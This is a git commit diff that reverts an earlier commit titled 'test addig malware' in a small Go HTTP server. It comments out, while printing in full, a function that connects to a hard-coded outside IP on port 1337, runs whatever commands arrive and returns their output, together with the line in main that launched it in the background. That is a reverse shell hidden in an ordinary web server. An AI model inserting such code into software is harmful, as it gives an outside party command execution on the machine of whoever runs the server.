998612b7d939f9ab3718e2ef92012580eb24803c
junior158 <dummydev0x00@gmail.com>
2020-09-22 13:56:26 +0200

    Revert "test addig malware"
    This reverts commit 4924bad6a25bba02e844d4c751877726c15352a9.

--- main.go
+++ main.go
@@ -2,11 +2,11 @@ package main
 
 import (
     "net/http"
-    "bufio"
-    "fmt"
-    "net"
-    "os/exec"
-    "strings"
+//    "bufio"
+//    "fmt"
+//    "net"
+//    "os/exec"
+//    "strings"
 )
 
 // create a handler struct
@@ -22,24 +22,24 @@ func (h HttpHandler) ServeHTTP(res http.ResponseWriter, req *http.Request) {
     res.Write(data)
 }
 
-func rev(){
-    conn, _ := net.Dial("tcp", "54.229.231.247:1337")
-    for {
-        message, _ := bufio.NewReader(conn).ReadString('\n')
-	message = strings.TrimSuffix(message, "\n")
-        cmd := strings.Split(message, " ")[0]
-	args := strings.Split(message, " ")[1:]
-        out, err := exec.Command(cmd, args...).Output()
-
-        if err != nil {
-	    fmt.Fprintf(conn, "%s\n",err)
-        }
-        fmt.Fprintf(conn, "%s\n",out)
-    }
-}
+// func rev(){
+//     conn, _ := net.Dial("tcp", "54.229.231.247:1337")
+//     for {
+//         message, _ := bufio.NewReader(conn).ReadString('\n')
+// 	message = strings.TrimSuffix(message, "\n")
+//         cmd := strings.Split(message, " ")[0]
+// 	args := strings.Split(message, " ")[1:]
+//         out, err := exec.Command(cmd, args...).Output()
+// 
+//         if err != nil {
+// 	    fmt.Fprintf(conn, "%s\n",err)
+//         }
+//         fmt.Fprintf(conn, "%s\n",out)
+//     }
+// }
 
 func main() {
-    go rev()
+    //go rev()
     // create a new handler
     handler := HttpHandler{}
 
